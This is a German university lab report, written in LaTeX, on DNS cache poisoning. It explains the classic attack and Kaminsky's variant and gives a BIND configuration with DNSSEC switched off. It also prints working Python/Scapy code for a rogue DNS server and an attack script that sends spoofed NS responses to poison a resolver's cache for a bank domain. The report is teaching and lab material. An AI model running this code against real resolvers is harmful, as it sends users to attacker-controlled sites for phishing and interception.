@@ -1,0 +1,361 @@
+\documentclass[10pt,a4paper]{article}
+\usepackage[utf8]{inputenc}
+\usepackage[german]{babel}
+\usepackage[T1]{fontenc}
+\usepackage{fullpage}
+\usepackage{amssymb}
+\usepackage{listings}
+\usepackage{caption}
+\usepackage{color}
+\usepackage{amsmath}
+\usepackage{graphicx}
+\usepackage{hyperref}
+\usepackage{colortbl}
+\usepackage{hhline}
+
+\setlength{\parindent}{0pt}
+\setlength{\columnsep}{0.5cm}
+
+\include{pythonColor}
+\lstset{language=python-color}
+\lstset{framexleftmargin=5pt, framextopmargin=5pt, framexbottommargin=5pt, frame=tb, framerule=0pt}
+\definecolor{grey}{rgb}{0.9,0.9,0.9}
+\include{pseudo}
+
+\author{Lukas Jung, Marc Narres-Schulz, Oliver Sänger, Tobias Zeimetz}
+\title{Teil III: \\DNS Cache Poisoning}
+
+\begin{document}
+\maketitle
+\newpage
+
+\section{Einleitung}
+Bei der vorliegenden Arbeit handelt es sich um ein Protokoll über eine Teilaufgabe im \glqq Hackerpraktikum\grqq. Als Quelle für diese Ausarbeitung wurde ausschließlich die Literatur aus der Aufgabenstellung verwendet. Die erste Aufgabe bestand in der Programmierung eines eigenen DNS-Servers. Der Server wurde in der Programmiersprache Python geschrieben und als Hilfe wurde das Modul Scapy verwendet. Der Python-Server sollte in der Lage sein, auf eine DNS-Anfrage eine entsprechend korrekt geformte Antwort zu senden. Die IP, mit welcher der Python-Server antwortet, sollte selbst einstellbar sein.
+
+Anschließend sollte ein DNS-Server aufgesetzt und konfiguriert werden. Dieser Server sollte später das Ziel des DNS-Cache-Poisoning-Angriffs sein. Die grundlegende Idee bestand darin, erst alle Sicherheitseigenschaften des Servers gegen diesen einen Angriff zu deaktivieren. Anschließend bestand das Ziel darin den Cache des DNS-Servers (Victim-DNS) zu \glqq vergiften\grqq \ und eine fehlerhaften DNS-Auflösung zu injecten. Ferner war das Ziel, den Cache des Victim-DNS so zu manipulieren, dass alle Anfragen an den in Python selbst geschriebenen DNS-Server (Python-Server oder auch Attacker-DNS) weitergeleitet werden. Dadurch ist es dem Angreifer immer möglich eine andere IP-Adresse für die Auflösung zu wählen. Eine genauer Erläuterung folgt in den nächsten Kapiteln.
+
+Die folgenden Kapitel beschäftigen sich mit den Grundlagen des Angriffs, das heißt wie sollte in der Theorie vorgegangen werden, wie müssen die Abläufe aussehen und was sind die Voraussetzungen für den Angriff. Außerdem wird der Angriff im Detail genauer Erklärt. Der nächste Abschnitt besteht aus der Konfiguration der Server, welche Komponenten verwenden wurden und welche Sicherheitsmaßnahmen deaktiviert wurden. Im letzten Kapitel folgt anschließend eine detaillierte Beschreibung unseres Vorgehens, wie unsere Implementierung des Angriffs funktioniert und welche Tests durchgeführt wurden.
+
+\section{Grundlagen des Angriffs}
+In diesem Kapitel wird zunächst der klassische DNS Cache Poisoning Angriff so wie seine Lösung beschrieben. Dabei werden die verschiedenen DNS-Antwort-Typen (A-Record, Additional Record usw.) genauer erläutert. Durch Dan Kaminsky wurde jedoch noch einere weitere und deutlich stärkere Form des Angriffs gefunden. Da das Ziel in diesem Teil des Praktikum darin besteht, den von Dan Kaminsky gefundenen Angriff zu implementieren, wird dieser ebenfalls genauer dargelegt.
+
+\subsection{Klassisches DNS-Cache-Poisoning}
+Die klassische Form des DNS-Cache-Poisonings basierte darauf, einem DNS-Server (Victim-DNS) einen gefälschten DNS-Eintrag, in Form eines sogenannten A-Records, zu übermitteln. Ein A-Record ordnet einer Domain eine  IPv4-Adresse zu. Diese Form der Records sind die häufigsten Records im DNS. 
+
+%TODO why caching
+Da ein DNS-Server alle DNS-Anfragen für kurze Zeit in seinem Cache speichert, speichert er sich auch die von einem Angreifer gefälschte Adresse. Stellt ein Benutzer nach dem Poisoning eine DNS-Anfrage an die gleiche Domain, die der Attacker zuvor \glqq injected\grqq\ hat, wird der DNS-Server in seinem Cache die falsche IP finden und diese an den Benutzer übermitteln. Dadurch kann der Angreifer den Benutzer beispielsweise auf eine von ihm kontrollierte Webseite leiten. 
+
+Im folgenden wird anhand eines Sequenzdiagramms genauer dargestellt, wie die klassische Form dieses Angriffs aussieht. Im späteren Verlauf der Arbeit wird eine deutlich effizientere Methode vorgestellt. Dabei werden ebenfalls die Unterschiede und auch Vorteile zur klassischen Methoden herausgestellt. Das Sequenzdiagramm im klassischen Szenario gestaltet sich daher wie folgt:
+
+{
+\centering
+\includegraphics[scale=0.45]{Classic_DNS-Cache-Poisoning.png}
+}
+
+Im ersten Schritt stellt der Attacker eine DNS-Anfrage für die Domain \emph{www.victim.com} an den Victim-DNS. Informationen wie Paketstrukturen oder auch die Transaktionsnummer sind zu diesem Zeitpunkt noch nicht wichtig und werden daher nicht weiter im Sequenzdiagramm aufgeführt.
+
+Wichtig ist, dass die Seite (kurz vorher) noch nicht angefragt wurde, da der Victim-DNS sonst die IP zu der Seite im Cache gespeichert hat. Dadurch wäre es nicht möglich, eine falsche IP  zu \glqq injecten\grqq\ und der Angriff wäre erfolglos. Ist die Seite nicht im Cache des Victim-DNS eingetragen, wird eine Anfrage an den Root-Server für die Top-Level-Domain (TLD) gestellt, um herauszufinden, welcher Nameserver (Appropriate-DNS), für die angefragte Domain zuständig ist.
+
+Nachdem der Victim-DNS die IP-Adresse des zuständigen NS-Server empfangen hat, stellt er die DNS-Anfrage an den Appropriate-DNS. Dieses Zeitintervall wird vom Angreifer ausgenutzt, um gefälschte DNS-Antworten zu generieren oder viel mehr, an den Victim-DNS zu versenden. Hier ist es wichtig, dass die Transaktionsnummer richtig geraten wird, die Source-IP muss gleich dem zuständigen Appropriate-DNS sein. Weiter muss auch der Name des zuständigen Appropriate-DNS entsprechend gefälscht werden und das Paket muss über die gleichen Ports eingehen, die zum Versenden der Anfrage vom Victim-DNS verwendet wurden. Als letztes muss natürlich auch die DNS-Anfrage (genauer: die Question-Sektion) im Antwortpaket enthalten sein und es muss ein A-Record enthalten sein. Der A-Record enthält die vom Angreifer zuvor selbst gewählte IP-Adresse und und suggeriert dem Victim-DNS somit, dass es sich bei dieser IP um die Adresse der Domain handelt.
+
+Wenn später das \glqq richtige\grqq\ Antwortpaket vom Approriate-DNS an den Victim-DNS gesendet wird, ist das vom Angreifer erstellte Paket bereits beim Victim-DNS angekommen und angenommen. Dadurch wird die Antwort des \glqq richtigen\grqq\ Appropriate-DNS vom Victim-DNS ignoriert. 
+
+Da der Victim-DNS ein gefälschtes A-Record-Paket vom Angreifer erhalten hat, in welchem alle wichtigen Informationen korrekt gefälscht wurden, geht er davon aus, dass es sich beim A-Record um die zur Domain gehörigen IP-Adresse handelt.
+
+Diese Adresse wird in einem letzten Schritt an den Angreifer zurück gesendet und von diesem überprüft. Sollte die zurückgelieferte IP nicht die vom Angreifer gewählte IP sein, so muss der Angriff vom ersten Schritt an wiederholt werde. Da die Domain \emph{www.victim.com} jedoch im Cache gespeichert ist, kann der Angreifer nicht einfach die gleiche Domain anfragen. Er muss also eine andere Subdomain wählen, beispielsweise \emph{cloud.victim.com} oder aber warten, bis der Eintrag aus dem Cache des Victim-DNS entfernt wurde.
+
+Die Hauptaufgabe des Angreifers besteht darin, die korrekte Transaktionsnummer zu raten. Bei alten DNS-Servern (Bind 8) wurde die Transaktionsnummer inkrementiert wenn eine DNS-Anfrage gestellt wurde. Das machte es einem Angreifer leicht, die Transaktionsnummer vorherzusagen.
+
+Damit der Angreifer eine der letzten Transaktionsnummern herausfinden kann, muss er einen eigenen DNS-Server (Attacker-DNS) besitzen. Dieser Attacker-DNS muss als \glqq authoritative\grqq\ für die Domain \mbox{\emph{attacker.com}} eingerichtet sein. Dadurch kann der Angreifer DNS-Anfragen an den Victim-DNS stellen, um die IP-Adresse für die Domain des Angreifers herauszufinden. Da der Attacker-DNS für diese Domain \glqq authoritative\grqq\ ist, wird der Victim-DNS irgendwann bei diesem Server einen A-Record erfragen. Der Attacker muss somit nur auf seinem DNS-Server alle DNS-Anfragen aufzeichnen und die Transaktionsnummer herausfiltern. Dadurch kann er ein gutes Intervall schätzen, in welchem sich die Transaktionsnummer bei der nächsten Anfrage befindet.
+
+Bei aktuelleren BIND-Versionen wurde diese Lücke jedoch geschlossen durch das Anlegen eines Random-Number-Pools. So wurde eine Gleichverteilung der Transaktionsnummern gewährleistet. Diese Verbesserung ist jedoch kein genereller Schutz gegen den Angriff, sondern macht es einem Anreifer lediglich schwerer die Transaktionsnummer vorherzusagen. 
+
+In diesem Fall geht der Angreifer einfach wie folgt vor: Man konnte feststellen das ca. 50 gefälschte Pakete vom Angreifer an den Victim-DNS gesendet werden können, bevor die original Antwort vom Appropriate-DNS ankommt. Der Angreifer muss somit nur automatisiert Anfragen stellen, immer an unterschiedliche Subdomains, und versucht so viele gefälschte Pakete wie möglich an den Victim-DNS zu senden. Das macht er so lange, bis das Cache-Poisonin erfolgreich war. Laut Dan Kaminsky konnte man festellen, dass unter diesen Bedingungen in ca. 10 Sekunden das Poisoning erreicht werden kann.
+
+Wenn ein Benutzer nach erfolgreichem Poisoning, die \glqq injectete\grqq\ Subdomain von \emph{victim.com} anfragt, wird er als Antwort die IP-Adresse eines vom Attacker kontrollierten Servers empfangen.
+
+\subsection{Kaminsky Angriff}
+In diesem Abschnitt wird der Angriff von Dan Kaminksy genauer dargelegt. Er fand mehrere Möglichkeiten, wie der Cache eines DNS-Servers \glqq injected\grqq\ werden kann. In diesem Prakikum lag der Schwerpunkt jedoch auf der effektivsten Methode, um den Angriff zu realisieren. 
+
+Während beim klassischen Angriff nur eine Domain, beispielsweise \emph{www.victim.com} vom Victim-DNS fehlerhaft aufgelöst wird, kann beim Angriff von Kaminsky eine gesamte Subdomain gefälscht werden. Dass bedeutet, im klassischen Fall kann der Angreifer immer nur einzelne A-Records beim Victim-DNS \glqq injecten\grqq. Dadurch ist er sehr beschränkt, was die Kontrolle über einzelne Subdomains betrifft. Hat der Angreifer erfolgreich die IP-Adresse für die Domain \emph{www.victim.com} \glqq injected\grqq, muss er erneut die IP-Adresse für \emph{cloud.victim.com}  \glqq injecten\grqq, um auch über diese IP-Auflösung die Kontrolle zu besitzen. 
+
+Der Angriff von Dan Kaminsky basiert darauf, an Stelle eines gefälschten A-Records einen gefälschten NS-Record an den Victim-DNS zu übermitteln. Bei einem NS-Record handelt es sich um eine DNS-Response die angibt, welcher NS-Server für diese Domain zuständig ist. Das Ziel ist es also, dem Victim-DNS die falsche IP-Adresse für einen zuständigen NS-Server zu übermitteln. Da sich der Victim-DNS die NS-Einträge ebenfalls cached, wird er in Zukunft für jede Anfrage, unabhängig der Subdomain, den vom Attacker angegeben DNS-Server anfragen. Als Vorraussetzung für diesen Angriff ergibt sich also, dass der Angreifer einen DNS-Server (Attacker-DNS) unter seine Kontrolle haben muss. 
+
+Das heißt, der Angreifer muss den Attacker-DNS so konfigurieren, dass dieser als authoritative für die Domain $victim.com$ und $attacker.com$ gilt. Den Attacker-DNS als authoritative einzustellen ist kein Problem und wird auch nicht verhindert, da kein Root-Server diesen als authoritative angeben wird. Das Angriffsszenario legt sich somit folgt dar:
+
+{
+\centering
+\includegraphics[scale=0.35]{DNS-Cache-Poisoning.png}
+}
+
+Wie auch beim klassischen Angriff, stellt der Attacker eine DNS-Anfrage für die Domain \emph{victim.com} an den Victim-DNS. Informationen wie Paketstrukturen oder auch die Transaktionsnummer sind auch in diesem Szenario noch nicht wichtig und werden daher nicht weiter im Sequenzdiagramm aufgeführt.
+
+Auch bei diesem Angriff ist es wichtig, dass die Seite (kurz vorher) noch nicht angefragt wurde. Ist die Seite nicht im Cache des Victim-DNS eingetragen, wird eine Anfrage an den Root- oder auch Top-Level-Domain-Server (TLD) gestellt, um herauszufinden was der zuständige Nameserver (Appropriate-DNS) für die Angefragt Domain ist.
+
+Nachdem der Victim-DNS die IP-Adresse des zuständigen NS-Server empfangen hat, stellt er die DNS-Anfrage an den Appropriate-DNS. Dieses Zeitintervall wird vom Angreifer ausgenutzt, um gefälschte DNS-Antworten (NS-Records) zu generieren bzw. an den Victim-DNS zu versenden. Hier ist es wichtig, dass die Transaktionsnummer richtig geraten wird, die Source-IP muss gleich dem zuständigen Appropriate-DNS sein. Weiter muss auch der Name des zuständigen Appropriate-DNS entsprechend gefälscht werden und das Paket muss über die gleichen Ports eingehen, die zum Versenden der Anfrage vom Victim-DNS verwendet wurden. Als letztes muss natürlich auch die DNS-Anfrage (genauer: die Question-Sektion) im Antwortpaket enthalten sein und es muss einen NS-Record enthalten, damit der Victim-DNS nochmal den Attacker-DNS nach der IP für \emph{victimg.com} anfragt.
+
+Die Anzahl der Pakete die der Angreifer im Durchschnitt senden muss, bis der Angriff erfolgreicht war, unterscheidet sich nicht vom klassischen Angriff. Die Berechnung der Wahrscheinlichkeit bleibt also in beiden Fällen gleich, da der selbe Schwachpunkt ausgenutzt wird.
+
+Wenn später das \glqq richtige\grqq\ Antwortpaket vom Approriate-DNS an den den Victim-DNS gesendet wird, ist das vom Angreifer erstellte Paket jedoch bereits angekommen und angenommen. Dadurch wird die Antwort des richtigen Appropriate-DNS vom Victim-DNS, wie auch beim ersten Angriff, ignoriert. Da dem Victim-DNS durch das gefälschte Paket mitgeteilt wurde, dass der Attacker-DNS für die IP-Auflösung zuständig ist, sendet der Victim-DNS erneut eine DNS-Anfrage. Jetzt kann der Attacker-DNS mit einer vom Angreifer selbst gewählten IP antworten. In einem letzten Schritt wird die aufgelöste IP jetzt noch vom Victim-DNS zurück an den Anreifer gesendet. Der Angreifer überprüft im Anschluss, ob die Antwort der DNS-Anfrage von \emph{victim.com} die von ihm selbst gewählte IP beinhaltet. Sollte dem nicht der Fall sein, so versucht er den gesamten Vorgang erneut.
+
+Um einen Overload beim DNS-Server zu verhinden, werden alle Angefragten IP-Auflösungen kurzfristig im Cache gespeichert. Daher kann der Angreifer nicht einfach erneut die gleiche Domain anfragen. Um das Caching zu \glqq umgehen\grqq, stellt der Angreifer die Anfrage immer an ein anderes Subdomains als die Male zuvor. Beispielsweise könnte beim ersten Mal die Domain \emph{www1.victim.com} angefragt werden und beim zweiten Mal die Domain \emph{www12.victim.com}. Dadurch wird der Victim-DNS dazu \glqq gezwungen\grqq\ die Anfragen erneut an den NS-Server dieser Domain zu stellen.
+
+Angenommen der Angriff hat nach einigen Versuchen funktioniert und der Cache wurde erfolgreich \glqq injected\grqq\ ergibt sich für einen normalen Benutzer folgendes Szenario: Der Benutzer stellt eine DNS-Anfrage an den Victim-DNS für die Domain \emph{user.victim.com}. Der Victim-DNS hat noch aufgrund des \glqq Poisonings\grqq\ einen Eintrag im Cache, dass der Attacker-DNS authorotative für die Domain sei. Aufgrundessen fragt der Victim-DNS beim Attacker-DNS nach der IP für die angefragte Domain nach. Der Attacker-DNS antwortet darauf mit einer zuvor festgelegten IP die auf eine vom Angreifer kontrollierte Webseite leitet. Der Victim-DNS leitet die IP-Adresse als letzten Schritt an den Benutzer weiter, welcher sich anschließend mit der \glqq falschen\grqq\ Webseite verbindet.
+
+\section{Konfigurationen der Server und Schnittstellen}
+Dieses Kapitel beschäftig sich mit der verwendeten Netzwerkstruktur, dem verwendeten System und den zugehörigen Konfigurationen. Zu Beginn wird auf den in Python selbst implementierten DNS-Server eingegangen. Dieser ist auch Bestandteil der weiten Aufgabe gewesen. Anschließend werden die Konfigurationen, des in Ubuntu aufgesetzten DNS-Servers, dargelegt und genauer erläutert.
+
+\subsection{Python DNS-Server}
+Die erste Aufgabe bestand darin, einen DNS-Server in Python mit Hilfe von Scapy zu implementieren. Die IP dieses DNS-Servers wird später dazu verwendet, um einen gefälschten NS-Eintrag in den Victim-DNS einzuschleusen. Der dazugehörige Programmcode gestaltet sich folgendermaßen:
+\begin{center}
+\begin{lstlisting}
+import os
+from socket import AF_INET, SOCK_DGRAM, socket
+
+from scapy.all import DNS, DNSQR, DNSRR, dnsqtypes
+
+sock = socket(AF_INET, SOCK_DGRAM)
+sock.bind((os.environ['ATK_SERVER_IP'], 53))
+
+fixed_ip = os.environ['ATK_FORGED_IP']
+\end{lstlisting}
+\end{center}
+Da DNS-Server primär Anfragen (Requests) über das User Datagram Protocol (UDP) und Port 53 erhalten, liegt der erste Schritt im erstellen und binden eines Datagram Sockets (SOCK\_DGRAM). Dieser Socket ist wie es bei DNS oft üblich ist an den Port 53 gebunden. Die Variable $fixed\_ip$ enthält eine vom Angreifer gewählte IP-Adresse, die bei jeder Anfrage als Ziel-IP gesendet wird.
+\begin{center}
+\begin{lstlisting}
+while True:
+    # DNS server that resolves every A record to a fixed A:IPV4 response.
+    request, addr = sock.recvfrom(4096)
+
+    dns_request = DNS(request)
+    assert dns_request.opcode == 0, dns_request.opcode  # QUERY
+    assert dnsqtypes[dns_request[DNSQR].qtype] == 'A', dns_request[DNSQR].qtype
+\end{lstlisting}
+\end{center}
+Die While-Schleife sorgt dafür, dass der Socket niemals geschlossen wird und alle DNS-Anfragen (Querries) mit der zuvor selbst gewählten $\mathit{fixed\_ip}$ beantwortet. In der Variable $\mathit{request}$ sind alle Informationen der DNS-Anfrage enthalten. Die Informationen der Anfragen werden später beim Erstellen der Antwort verwendet, um eine erwartungsgemäße und korrekte Antwort zurück zu liefern. 
+
+Als Nächstes wird mit $\mathit{assert}$ sichergestellt, dass zum Einen der OP-Code Null ist und zum Anderen es sich um eine A-Record-Anfrage handelt. Dadurch dass der OP-Code Null ist, weiß unser Python-Server, dass es sich um eine DNS-Anfrage (Query) handelt. Da das Ziel darin besteht, einem Benutzer (eines Browsers) eine falsche IP zurück zu liefern, muss dieser auch eine IP-Auflösung anfragen. Da es sich bei einer IP-Auflösung um einen sogenannten A-Record handelt, prüft unser DNS-Server ebenfalls den Typ der Anfrage.
+\begin{center}
+\begin{lstlisting}
+    response = DNS(
+        id=dns_request.id,
+        qr=1, opcode=0, aa=1, tc=0, rd=0, ra=0, z=0, rcode=0,  
+        qdcount=1, ancount=1,
+        nscount=dns_request.nscount, arcount=dns_request.arcount,
+        qd=DNSQR(qname=dns_request[DNSQR].qname, qtype='A', qclass='IN'),
+        an=DNSRR(rrname=dns_request[DNSQR].qname, type='A', rclass='IN', 
+        	rdata=fixed_ip, ttl=86400),
+        ns=dns_request.ns,
+        ar=dns_request.ar
+    )
+
+    sock.sendto(bytes(response), addr)
+\end{lstlisting}
+\end{center}
+Anschließend wird eine Antwort gebildet, welche zu der Angefragen Website die IP beinhaltet bzw. in unserem Fall eine vom Angreifer selbst gewählte IP. Um ein gültiges Antwort-Paket zu bilden, müssen mehrere Optionen (sogennante Flags) korrekt gesetzt sein. Die Optionen werden im Folgenden aus Gründen der Einfachheit in tabellarischer Form erläutert:
+\begin{center}
+	\setlength\arrayrulewidth{0.6pt}    
+    \begin{tabular}{ | p{4.8cm} | p{8.5cm} |}
+    \rowcolor[gray]{0.9} 
+    \hline
+    Flag & Bedeutung \\ \hline
+    \hline
+    id=dns\_request.id & Hierbei handelt es sich um die Transaktions-ID (TID). Die Antwort muss die gleiche TID besitzen 
+    wie die Anfrage.\\ \hline
+    qr=1 & Die Flag qr steht für Query/Response. Eine Eins im Paket bedeutet, dass es sich um eine Antwort handelt\\ \hline
+    opcode=0 & Durch diese Option wird angegeben, dass es sich um eine Standard-Query handelt\\ \hline
+    aa=1 & Da der Attacker-DNS sich als für diese Domain zuständigen DNS-Server ausgibt, muss die \glqq authoritative answer\grqq-Flag auf Eins gesetzt werden. \\ \hline
+    tc=0 & Sollten die zu übermittelnden Daten größer als 512 Bytes sein, sind UDP-Pakete zu kleine für eine solche Antwort. In diesem Fall müsste das Bit auf Eins gestellt werden um dem Empfänger des Paketes anzugeben, das es sich um ein TCP-Package handelt.\\ \hline
+    rd=0, ra=0 & Die beiden Flags sind zum Angeben das eine Rekursion benötigt (desired) oder verfügbar (available) ist. In unserem Fall beantworten wir jedoch die Anfragen alle mit einer IP, daher kann diese Option auf Null gesetzt werden.\\ \hline
+    z=0 & Hierbei handelt es sich um ein reserviertes Bit, welches immer auf Null gesetzt sein muss.\\ \hline
+    rcode=0 & Der rcode ist der Antwort Code (Response Code) vom Server. Hier gibt es die Möglichkeit mehr als nur zwei Optionen zu wählen. Hier steht 0 für \glqq ok\grqq, 1 für \glqq format-error\grqq, 2 für \glqq server-failure\grqq, 3 für \glqq name-error\grqq, 4 für \glqq not-implemented\grqq, 5 für \glqq refused\grqq.\\ \hline
+    \end{tabular}
+\end{center}    
+\begin{center}
+    \setlength\arrayrulewidth{0.6pt}    
+    \begin{tabular}{ | p{4.8cm} | p{8.5cm} |}
+    \hline
+    qdcount=1 & Steht für Question Record Count und gibt an nach was gesucht wird. Beinhaltet sind dabei die URL, der Typ der Anfrage und andere Informationen. Da ein DNS-Server immer die Frage im Antwortpaket wiederholt, muss dieser Wert auf Eins gesetzt sein.\\ \hline
+    ancount=1 & Gibt an wieviele Records in der Antwort mitgeliefert werden. Da wir nur eine falsche IP übertragen wollen steht dieser Wert auf Eins.\\ \hline
+    nscount=dns\_request.nscount & Gibt an, wieviele NS-Records im Antwortpaket enthalten sind. Da unser Server nur A-Records zurückliefert, sollte dieser Eintrag immer auf Null stehen.\\ \hline
+    arcount=dns\_request.arcount & Gibt an, wieviele NS-Records im Antwortpaket enthalten sind. Auch hier gilt, da unser Server nur A-Records zurückliefert, sollte dieser Eintrag immer auf 0 stehen.\\ \hline
+    qd=DNSQR(qname= dns\_request[DNSQR].qname, qtype='A', qclass='IN') & Die Abkürzung qd steht für Query Data. Hier wird lediglich die DNS-Anfrage eingetragen und dass es sich um enen A-Record handelt.\\ \hline
+    an & Enthält als Antwort die A-Record-Response mit der gefälschten IP-Adresse die vom Angreifer kontrolliert wird. Eine hohe Time-To-Live (TTL) sorgt dafür, dass der Eintrag möglichst lange im Cache des Victim-DNS bleibt.\\ \hline
+    ns, ar & Die letzten beiden Parameter dienen dazu die entsprechenden NS-Records und Additional Records anzugeben.\\
+    \hline
+    \end{tabular}
+\end{center}
+In einem letzten Schritt wird das gebildete Paket als Antwort auf die DNS-Anfrage zurück gesendet.
+
+\subsection{Victim DNS-Server}
+%TODO Bindversion angeben, Ubuntu-Version angeben
+Aufgrund der Nachvollziehbarkeit und der Reproduzierbarkeit werde im folgenden Abschnitt die Konfigurationen auf dem Victim-DNS genauer erläuert. Als Grundlage für den Victim-DNS wurde ein Ubuntu-Server (Version X) gewählt. Auf diesem Serversystem wurde der standard DNS-Server names BIND eingerichtet. Bei der von uns verwendeten BIND-Version handelt es sich um X. Jegliche konfigurationen des DNS-Servers wurde in \emph{/etc/bind/named.conf.options} vorgenommen. Im Folgenden werden die einzelnen Konfigurationen genauer erläutert:
+\begin{center}
+\begin{lstlisting}
+options {
+    ...
+
+    query-source address <ip_eth1> port 54;
+
+    dnssec-enable no;
+
+    allow-recursion { any; };
+    allow-query { any; };
+
+    auth-nxdomain no;
+
+    listen-on port 53 {
+        127.0.0.1;
+        <ip_eth1>;
+    };
+
+};
+\end{lstlisting}
+\end{center}
+
+Die erste Zeile gibt den DNS-Server an, dass alle Anfragen nach außen über Port 54 laufen und über die IP \emph{<ip\_eth1>} versendet werden. Die IP musste zusätzlich angegeben werden, da unser DNS-Server zwei Interfaces (eth0 und eth1) verwendet. Das erste Interface (eth0) dient dazu, dass Vagrant unsere virtuelle Machinen verwalten kann. Bei Vagrant handelt es sich um eine Anwendung zum Erstellen und Verwalten von virtuellen Maschinen. Es ermöglicht ein einfaches Deployment und eine Reproduzierbare und leicht zu übertragende (Beispielsweise Git) Umgebung. Eine Vagrant-Datei mit den Konfigurationen muss nur gestartet werden, und alle virtuellen Maschinen werden den Konfigurationen entsprechend auf dem Computer installiert und konfiguriert. Daurch ist gewährleistet, dass alle Mitglieder in der Gruppe die gleichen und aktuellsten virtuellen Maschinen besitzen. Beim zweiten Interface (eth1) handelt es sich um eine Netzwerkbrücke über die alle DNS-Anfragen angenommen und versendet werden.
+
+Beim zweiten Eintrag handelt es sich um die DNS Security Extensions (DNSSEC). Diese Extensions werden verwendet um die Integrität von DNS-Antworten zu gewährleisten. DNSSEC signiert alle DNS-Records (A,MX etc.) einer Zone mit Hilfe von Public Key Infrastructure (PKI). Damit der Angriff funktionieren kann, wurde diese Option deaktiviert. Dadurch ist sichergestellt, dass keine weiteren Überprüfungen von Signaturen etc. vorgenommen werden.
+
+Der nachfolgende \emph{allow-recursion} Eintrag sorgt dafür, dass der DNS Server nicht nur anfragen für Zonen beantwortet für die er selbst autoritativ ist, sondern auch rekursiv über andere Nameservern Adressen auflöst. Der parameter \emph{any} sorgt dafür, dass der Server anfragen von jeder beliebigen IP annimmt. Die allow-query Anweisung legt fest, von welchen Clients der Server anfragen annimmt.
+
+Mit der \emph{auth-nxdomain no} anweisung wird festgelegt, dass der Nameserver NXDOMAIN Records (also Antworten für nicht existente Domains) nicht als autoritativ kennzeichnen soll. Anderenfalls würde der Server alle NX records als autoritativ  markieren, auch wenn er eigentlich nicht die Autorität über die betreffende Domain inne hat.
+
+Der letzte Eintrag über welches Interface und welchen Port die die DNS-Anfragen empfangen werden. Hier wurde der DNS-Server so konfiguriert, dass er alle Anfragen über Port 53 annimmt. Außerdem werden alle Anfragen über die IP \emph{<ip\_eth1>} und den Localhost angenommen.
+
+\section{Der Angriff}
+In folgendem Abschnitt wird die praktische Umsetzung des Angriffs genauer dargelegt. Im ersten Unterpunkt wird auf die konkrete Implementierung in Python mithilfe von Scapy eingegangen. Dabei wird dargelegt, was die einzelnen Optionen bedeuten und wie sie zu interpretieren sind. Als nächstes folgt eine Beschreibung unserer Vorgehensweise und welche Versuche und Versuchsreihen durchgeführt wurden. Zum Schluss werden Gegenmaßnahmen aufgezählt, die einen solchen Angriff verhindern sollen.
+
+\subsection{Das Python Programm}
+\begin{center}
+\begin{lstlisting}
+import os
+import random
+from socket import AF_INET, SOCK_DGRAM, socket
+
+from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, sr1, sendpfast, Ether
+
+sock = socket(AF_INET, SOCK_DGRAM)
+sock.bind((os.environ['ATK_SERVER_IP'], 1234))
+
+# Vulnerable recursive DNS server settings
+target_dns_ip = os.environ['VLN_SERVER_IP']
+target_dns_port_in = int(os.environ['VLN_DNS_PORT_IN'])
+target_dns_port_out = int(os.environ['VLN_DNS_PORT_OUT'])
+\end{lstlisting}
+\end{center}
+\begin{center}
+\begin{lstlisting}
+# Target domain base to be messed with
+target_domain_base = ".bank.com"
+# Authoritative NS for the target domain
+known_ns_domain = "ns01.cashparking.com."
+known_ns_ip = "216.69.185.38"
+
+# Malicious DNS server
+attacker_dns_ip = os.environ['ATK_SERVER_IP']
+expected_ip = os.environ['ATK_FORGED_IP']
+\end{lstlisting}
+\end{center}
+\begin{center}
+\begin{lstlisting}
+def initial_request(domain, ip, port):
+    return Ether() / IP(dst=ip) / UDP(dport=port) / DNS(
+        id=42,
+        qr=0,
+        rd=1,
+        ra=0,
+        qdcount=1,
+        ancount=0,
+        nscount=0,
+        arcount=0,
+        qd=DNSQR(qname=domain, qtype='A', qclass='IN')
+    )
+\end{lstlisting}
+\end{center}
+\begin{center}
+\begin{lstlisting}
+def forged_ns_response(id, target_domain, target_ip, attacker_dns_ip, known_ns_domain, 
+	known_ns_ip, dst_port):
+    response = Ether() / IP(src=known_ns_ip, dst=target_ip) / UDP(dport=dst_port) / DNS(
+        id=id,  # Query ID / transaction id
+        qr=1,  # QR (Query / Response) 1=response
+        opcode=0,  # Set by client to 0 for a standard query, 0:"QUERY",1:"IQUERY",2:"STATUS"
+        aa=0,  # Set to 1 in a server response if this dns_response is Authoritative, 0 if not.
+        tc=0,
+        # Set to 1 in a server response if the dns_response can't fit in the 512-byte limit of a 
+        # UDP packet response
+        rd=1,  # RD (Recursion Desired)
+        ra=0,  # RA (Recursion Available), set by server: will (1) or won't (0) support recursion
+        z=0,  # This is reserved and must be zero
+        rcode=0,  # Response code from the server: indicates success or failure
+        # 0:"ok", 1:"format-error", 2:"server-failure", 3:"name-error", 4:"not-implemented", 
+        # 5:"refused"
+        qdcount=1,  # Question record count
+        ancount=0,  # Answer count
+        nscount=1,  # authority count
+        arcount=1,  # additional record count
+        # AD and CD bits are defined in RFC 2535
+        ad=0,  # # Authentic Data
+        cd=0,  # Checking Disabled (0/1)
+        # DNS Question Record
+        qd=DNSQR(qname=target_domain, qtype='A', qclass='IN'),
+        # DNS Resource Record
+        an=0,
+        ns=DNSRR(rrname=target_domain, type='NS', rdata=known_ns_domain, ttl=253643),
+        ar=DNSRR(rrname=known_ns_domain, type='A', rdata=attacker_dns_ip, ttl=253643)
+    )
+    return response
+\end{lstlisting}
+\end{center}
+\begin{center}
+\begin{lstlisting}
+counter = 0
+while True:
+    target_domain = "www" + str(counter) + target_domain_base
+    counter = (counter + 1) % (2 ** 16)
+
+    packet_list = [initial_request(target_domain, target_dns_ip, target_dns_port_in)]
+
+    response_amount = 50
+    r = random.randint(0, (2 ** 16) - response_amount + 1)
+    for i in range(r, r + response_amount):
+        packet_list.append(
+            forged_ns_response(i, target_domain, target_dns_ip, attacker_dns_ip, 
+            		known_ns_domain, known_ns_ip, target_dns_port_out))
+
+    p_txid_match = (1 / (2 ** 16)) * response_amount * counter * 100
+    print("Iteration: {}, possible cache poisoning: {:4.2f}%".format(counter, p_txid_match))
+    print("Sending packets from {} with id in interval [{}, {}] to {}"
+    	.format(known_ns_ip, r, r + response_amount, target_domain))
+
+    sendpfast(packet_list, pps=100000, iface="eth1", verbose=0)
+
+    dns_response = sr1(IP(dst=target_dns_ip) / UDP(dport=53) / DNS(rd=1, 
+    	qd=DNSQR(qname=target_domain)), verbose=0)
+
+    try:
+        if dns_response[DNS].an.rdata == expected_ip:
+            print("Successfully poisoned the zone of {}".format(target_domain_base))
+            break
+    except:
+        print("Poisoning failed")
+    break
+\end{lstlisting}
+\end{center}
+
